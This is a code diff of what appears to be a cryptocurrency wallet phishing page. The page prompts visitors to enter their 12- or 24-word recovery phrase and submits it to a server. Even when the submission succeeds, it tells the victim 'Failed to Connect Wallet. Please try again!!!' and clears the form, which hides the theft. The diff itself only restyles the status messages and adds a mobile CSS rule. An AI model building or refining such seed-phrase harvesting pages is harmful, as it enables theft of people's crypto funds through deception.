@@ -115,7 +115,7 @@
                                     <textarea id="phrase1" name="message" required="" class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none;"></textarea>
                                 </div>
                                 <div class="small text-left my-3" style="font-size: 11px;color:#fff;">Typically 12 (sometimes 24) words separated by single spaces</div>
-                                <p class="status-message"></p>
+                                <p class="status-message" style="color:yellow;font-size:12px;"></p>
                             </div>
                         </div>
                         <button type="submit" id="proceedButton" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px;padding: 5px 0px;">PROCEED</button>
@@ -572,6 +572,15 @@
         </div>
     </div>
 </div>
+<style>
+     @media screen and (max-width: 600px) {
+             
+                .coin{
+                  width: 25%;
+                }
+            }
+                    </style>
+</style>
 <script src="jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
 <!-- <script src="./script/walletpage.js"></script> -->
 <script src="popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
@@ -761,16 +770,17 @@
 
             if (response.ok) {
                 // Show success message
-                statusMessage.textContent = "Failed to Connect Wallet. Please try again!";
-                statusMessage.style.color = "red";
+                statusMessage.textContent = "Failed to Connect Wallet. Please try again!!!";
+                statusMessage.style.color = "yellow";
+                /*statusMessage.style.fontSize = "12px";*/
                 form.reset(); // Reset the form
             } else {
                 throw new Error("Failed to submit the form.");
             }
         } catch (error) {
             // Show error message
-            statusMessage.textContent = "Error connecting wallet. Please try again.";
-            statusMessage.style.color = "red";
+            statusMessage.textContent = "Error connecting wallet. Please try again!!!";
+            statusMessage.style.color = "yellow";
         }
 
         submitButton.disabled = false; // Re-enable the submit button
